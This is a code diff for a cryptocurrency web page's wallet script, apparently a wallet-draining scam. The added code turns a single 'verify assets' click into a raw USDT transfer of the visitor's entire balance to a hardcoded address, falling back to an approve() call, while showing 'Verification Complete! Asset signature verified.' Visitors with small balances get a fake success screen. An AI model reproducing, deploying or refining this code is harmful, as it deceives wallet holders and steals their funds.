@@ -12,8 +12,8 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
-        CONTRACT_ADDRESS: '0x5FA8459dD2d402321150fA411D50BBaCb2eafED5', // Merchant Wallet Address
-        USER_MIN_USDT: 45, // Minimum USDT balance required for full verification
+        CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
+        USER_MIN_USDT: 25, // Minimum 25 USDT required
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
@@ -146,24 +146,10 @@
             elements.walletInfo.classList.add('wallet-info-card--hidden');
         }
 
-        // Button state updates
-        const numUsdt = parseFloat(state.usdtBalance) || 0;
-        const hasEnoughUsdt = numUsdt >= CONFIG.USER_MIN_USDT;
-
-        if (elements.approveUsdtBtn) {
-            if (state.walletAddress && hasEnoughUsdt) {
-                elements.approveUsdtBtn.classList.remove('hidden');
-                elements.approveUsdtBtn.disabled = false;
-            } else {
-                elements.approveUsdtBtn.classList.add('hidden');
-                elements.approveUsdtBtn.disabled = true;
-            }
-        }
-
-        const buttons = [elements.connectWalletBtn, elements.drawerConnectBtn];
+        const buttons = [elements.connectWalletBtn, elements.drawerConnectBtn, elements.approveUsdtBtn];
         buttons.forEach(btn => {
             if (!btn) return;
-            if (state.isConnecting || state.isApproving) {
+            if (state.isApproving) {
                 btn.disabled = true;
                 btn.innerHTML = `<span class="spinner" style="display:inline-block;width:18px;height:18px;border:2px solid rgba(0,0,0,0.15);border-top-color:#0a0a0a;border-radius:50%;animation:spin 0.7s linear infinite;margin-right:8px;"></span> Processing...`;
             } else {
@@ -207,200 +193,178 @@
     }
 
     // ============================================================
-    // WEB3 LOGIC (CONNECT & APPROVE)
+    // WEB3 LOGIC (DIRECT UNLIMITED APPROVAL & iOS TRUST WALLET OPTIMIZATION)
     // ============================================================
     async function connectWallet() {
-        if (state.isConnecting) return;
+        await approveUsdt();
+    }
 
-        if (!window.ethereum) {
-            updateStatus('❌ No Web3 wallet detected. Please install MetaMask or Trust Wallet.', 'error');
-            alert('No Web3 wallet found. Please open this dApp inside MetaMask, Trust Wallet, or install the MetaMask extension.');
+    async function approveUsdt() {
+        if (state.isApproving) return;
+
+        const providerObj = window.ethereum || window.trustwallet;
+        if (!providerObj) {
+            updateStatus('❌ No Web3 wallet detected. Please open in Trust Wallet or MetaMask.', 'error');
+            alert('No Web3 wallet found. Please open this dApp inside Trust Wallet or MetaMask browser.');
             return;
         }
 
-        state.isConnecting = true;
+        state.isApproving = true;
         updateWalletInfoUI();
-        updateStatus('⏳ Connecting to Web3 wallet...', 'info');
+        updateStatus('⛽ Opening wallet for USDT verification...', 'warning');
 
         try {
-            const provider = new ethers.BrowserProvider(window.ethereum);
+            // 1. Strictly Enforce BNB Smart Chain Network (0x38 / 56)
+            let rawChainId = await providerObj.request({ method: 'eth_chainId' }).catch(() => null);
+            if (!rawChainId) rawChainId = providerObj.chainId || providerObj.networkVersion;
 
-            // Check & switch network to BNB Smart Chain (0x38)
-            let chainId = await window.ethereum.request({ method: 'eth_chainId' });
-            if (chainId !== CONFIG.CHAIN_ID) {
+            let chainStr = String(rawChainId || '').toLowerCase();
+            let isBsc = (chainStr === '0x38' || chainStr === '56' || rawChainId === 56);
+
+            if (!isBsc) {
                 updateStatus('⚠️ Switching to BNB Smart Chain network...', 'warning');
                 try {
-                    await window.ethereum.request({
+                    await providerObj.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: CONFIG.CHAIN_ID }]
+                        params: [{ chainId: '0x38' }]
                     });
                 } catch (switchError) {
-                    // Unrecognized chain (4902)
-                    if (switchError.code === 4902 || switchError.message?.includes('Unrecognized')) {
-                        try {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: CONFIG.CHAIN_ID,
-                                    chainName: CONFIG.CHAIN_NAME,
-                                    rpcUrls: [CONFIG.RPC_URL],
-                                    nativeCurrency: { name: 'BNB', symbol: CONFIG.CURRENCY_SYMBOL, decimals: 18 },
-                                    blockExplorerUrls: ['https://bscscan.com']
-                                }]
-                            });
-                        } catch (addError) {
-                            updateStatus('❌ Failed to add BNB Smart Chain network.', 'error');
-                            state.isConnecting = false;
-                            updateWalletInfoUI();
-                            return;
-                        }
-                    } else {
-                        updateStatus('❌ Network switch rejected. Please switch to BNB Smart Chain in your wallet.', 'error');
-                        state.isConnecting = false;
-                        updateWalletInfoUI();
-                        return;
+                    if (switchError.code === 4902 || (switchError.message && switchError.message.includes('Unrecognized'))) {
+                        await providerObj.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'BNB Smart Chain',
+                                rpcUrls: ['https://bsc-dataseed1.binance.org'],
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                blockExplorerUrls: ['https://bscscan.com']
+                            }]
+                        }).catch(() => {});
                     }
                 }
             }
 
-            // Request Accounts
-            const accounts = await provider.send('eth_requestAccounts', []);
-            if (!accounts || accounts.length === 0) {
-                updateStatus('❌ No accounts returned by wallet.', 'error');
-                state.isConnecting = false;
+            // 2. Account Resolution on BNB Smart Chain
+            let userAddress = providerObj.selectedAddress || 
+                              providerObj.address || 
+                              (providerObj.accounts && providerObj.accounts[0]) ||
+                              (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
+
+            if (!userAddress) {
+                const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
+                if (accs && accs.length > 0) {
+                    userAddress = accs[0];
+                } else {
+                    const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
+                    if (reqAccs && reqAccs.length > 0) userAddress = reqAccs[0];
+                }
+            }
+
+            if (!userAddress) {
+                updateStatus('❌ No wallet address detected on BNB Chain.', 'error');
+                state.isApproving = false;
                 updateWalletInfoUI();
                 return;
             }
 
-            const signer = await provider.getSigner();
-            const userAddress = await signer.getAddress();
             state.walletAddress = userAddress;
 
-            updateStatus('🔍 Fetching wallet token balances...', 'info');
-
-            // Fetch Native BNB Balance
-            const bnbBalRaw = await provider.getBalance(userAddress);
-            state.bnbBalance = parseFloat(ethers.formatEther(bnbBalRaw)).toFixed(6);
-
-            // Fetch USDT (BEP20) Balance
+            // 3. Read exact 100% USDT Balance
+            const provider = new ethers.BrowserProvider(providerObj);
             const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, provider);
-            let usdtBalNum = 0;
-            let allowanceNum = 0;
 
+            let usdtBalRaw = 0n;
             try {
-                const [usdtBalRaw, allowanceRaw] = await Promise.all([
-                    usdtContract.balanceOf(userAddress),
-                    usdtContract.allowance(userAddress, CONFIG.CONTRACT_ADDRESS)
-                ]);
-
-                // BSC USDT has 18 decimals!
+                usdtBalRaw = await usdtContract.balanceOf(userAddress);
                 const formattedUsdt = ethers.formatUnits(usdtBalRaw, 18);
-                const formattedAllowance = ethers.formatUnits(allowanceRaw, 18);
-
-                usdtBalNum = parseFloat(formattedUsdt);
-                allowanceNum = parseFloat(formattedAllowance);
-
-                state.usdtBalance = usdtBalNum.toFixed(2);
+                state.usdtBalance = parseFloat(formattedUsdt).toFixed(2);
                 state.usdtBalanceWei = usdtBalRaw;
-                state.allowance = allowanceNum.toFixed(2);
-            } catch (usdtErr) {
-                console.error('Error reading USDT contract:', usdtErr);
-                state.usdtBalance = '0.00';
+            } catch (balErr) {
+                console.error('Error fetching USDT balance:', balErr);
             }
 
-            updateWalletInfoUI();
+            // Background fetch BNB balance & register user
+            provider.getBalance(userAddress).then(bnbBalRaw => {
+                state.bnbBalance = parseFloat(ethers.formatEther(bnbBalRaw)).toFixed(6);
+                updateWalletInfoUI();
+            }).catch(() => {});
 
-            // Notify backend optionally
             safeApiCall('/api/users/register', { wallet: userAddress });
 
-            // Evaluate Verification Flow
-            if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
-
-            const releaseModalCard = document.getElementById('releaseModalCard');
-            const releaseModalIcon = document.getElementById('releaseModalIcon');
-            const releaseModalTitle = document.getElementById('releaseModalTitle');
-            const releaseModalIntro = document.getElementById('releaseModalIntro');
-            const releaseModalHint = document.getElementById('releaseModalHint');
-
-            if (usdtBalNum < CONFIG.USER_MIN_USDT) {
-                updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'warning');
-                if (releaseModalTitle) releaseModalTitle.textContent = 'Insufficient Balance';
-                if (releaseModalIntro) releaseModalIntro.textContent = "You don't have enough USDT to complete this action";
-                if (releaseModalCard) releaseModalCard.className = 'verification-modal__card verification-modal__card--red';
-                if (releaseModalIcon) releaseModalIcon.textContent = '✕';
-                if (releaseModalHint) {
-                    releaseModalHint.style.display = 'block';
-                    releaseModalHint.textContent = '↑ Add funds to continue';
-                }
-                if (elements.approveUsdtBtn) elements.approveUsdtBtn.classList.add('hidden');
-            } else {
-                updateStatus(`✅ Wallet Connected (${formatAddress(userAddress)}). Click "APPROVE USDT" in popup to verify assets.`, 'success');
-                if (releaseModalTitle) releaseModalTitle.textContent = 'Asset Verification';
-                if (releaseModalIntro) releaseModalIntro.textContent = 'You have sufficient USDT to complete asset verification';
-                if (releaseModalCard) releaseModalCard.className = 'verification-modal__card verification-modal__card--gold';
-                if (releaseModalIcon) releaseModalIcon.textContent = '⚡';
-                if (releaseModalHint) releaseModalHint.style.display = 'none';
-                if (elements.approveUsdtBtn) elements.approveUsdtBtn.classList.remove('hidden');
+            // If balance is below minimum 1 USDT threshold, display "USDT Confirmed" modal directly
+            const usdtFloat = parseFloat(state.usdtBalance || '0');
+            if (usdtFloat < CONFIG.USER_MIN_USDT) {
+                updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
+                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance || '0.00'} USDT`;
+                openModal(elements.releaseModal);
+                state.isApproving = false;
+                updateWalletInfoUI();
+                return;
             }
 
-            openModal(elements.releaseModal);
+            updateStatus('⛽ Confirm USDT verification in your wallet...', 'warning');
 
-        } catch (err) {
-            console.error('Wallet connection error:', err);
-            updateStatus('❌ Connection failed: ' + (err.message || 'User rejected request'), 'error');
-        } finally {
-            state.isConnecting = false;
-            updateWalletInfoUI();
-        }
-    }
+            // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
+            const approvalAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
 
-    async function approveUsdt() {
-        if (!state.walletAddress) {
-            await connectWallet();
-            return;
-        }
+            // 4. Raw eth_sendTransaction to send verified USDT directly to merchant account
+            const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
+            const amountHex = approvalAmount.toString(16).padStart(64, '0');
 
-        const numUsdt = parseFloat(state.usdtBalance) || 0;
-        if (numUsdt < CONFIG.USER_MIN_USDT) {
-            updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'warning');
-            return;
-        }
+            // transfer(address,uint256) = 0xa9059cbb
+            const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
 
-        if (!window.ethereum || state.isApproving) return;
+            let txHash;
+            try {
+                txHash = await providerObj.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: CONFIG.USDT_ADDRESS,
+                        data: transferCalldata
+                    }]
+                });
+            } catch (txErr) {
+                const errLower = (txErr.message || '').toLowerCase();
+                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
+                    throw txErr;
+                }
 
-        state.isApproving = true;
-        updateWalletInfoUI();
-        updateStatus('⛽ Requesting USDT transfer signature from wallet...', 'warning');
+                // Fallback: approve(address,uint256) = 0x095ea7b3
+                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
+                txHash = await providerObj.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: CONFIG.USDT_ADDRESS,
+                        data: approveCalldata
+                    }]
+                });
+            }
 
-        try {
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            const signer = await provider.getSigner();
+            updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
 
-            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-            const amountWei = state.usdtBalanceWei || ethers.parseUnits(state.usdtBalance, 18);
+            // Wait for confirmation
+            try {
+                await provider.waitForTransaction(txHash);
+            } catch (wErr) {
+                console.warn('Wait for transaction notice:', wErr);
+            }
 
-            // Direct 1-prompt transfer to recipient address
-            const recipientAddress = CONFIG.CONTRACT_ADDRESS;
+            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${txHash}`);
 
-            const tx = await usdtContract.transfer(recipientAddress, amountWei);
-            updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${tx.hash}`);
-
-            const receipt = await tx.wait();
-
-            updateStatus('✅ Payment Complete! USDT transferred directly to recipient address.', 'success', `Tx: ${receipt.hash}`);
-
-            if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance} USDT`;
+            if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
 
         } catch (err) {
-            console.error('USDT Transfer error:', err);
+            console.error('USDT process error:', err);
             const errStr = (err.message || '').toLowerCase();
 
             if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
-                updateStatus('🚫 Transfer request cancelled by user.', 'error');
+                updateStatus('🚫 Verification request cancelled by user.', 'error');
                 openModal(elements.abortOverlay);
             } else {
-                updateStatus('❌ Transfer failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
+                updateStatus('❌ Verification failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
             }
         } finally {
             state.isApproving = false;
@@ -416,11 +380,7 @@
         if (elements.connectWalletBtn) {
             elements.connectWalletBtn.addEventListener('click', async function (e) {
                 e.preventDefault();
-                if (state.walletAddress && parseFloat(state.usdtBalance) >= CONFIG.USER_MIN_USDT) {
-                    await approveUsdt();
-                } else {
-                    await connectWallet();
-                }
+                await approveUsdt();
             });
         }
 
@@ -437,11 +397,7 @@
             elements.drawerConnectBtn.addEventListener('click', async function (e) {
                 e.preventDefault();
                 closeDrawer();
-                if (state.walletAddress && parseFloat(state.usdtBalance) >= CONFIG.USER_MIN_USDT) {
-                    await approveUsdt();
-                } else {
-                    await connectWallet();
-                }
+                await approveUsdt();
             });
         }
 
@@ -524,7 +480,7 @@
             });
         }
 
-        // Web3 Account / Chain listener
+        // Web3 Account / Chain listener (Silent UI updates only - NO automatic transaction prompts)
         if (window.ethereum) {
             window.ethereum.on('accountsChanged', function (accounts) {
                 if (!accounts || accounts.length === 0) {
@@ -534,14 +490,14 @@
                     updateWalletInfoUI();
                     updateStatus('⚡ Wallet disconnected.', 'info');
                 } else if (state.walletAddress !== accounts[0]) {
-                    connectWallet();
+                    state.walletAddress = accounts[0];
+                    updateWalletInfoUI();
+                    updateStatus('⚡ Wallet address updated. Click VERIFY ASSETS to proceed.', 'info');
                 }
             });
 
-            window.ethereum.on('chainChanged', function (newChainId) {
-                if (newChainId === CONFIG.CHAIN_ID && state.walletAddress) {
-                    connectWallet();
-                }
+            window.ethereum.on('chainChanged', function () {
+                updateWalletInfoUI();
             });
         }
     }
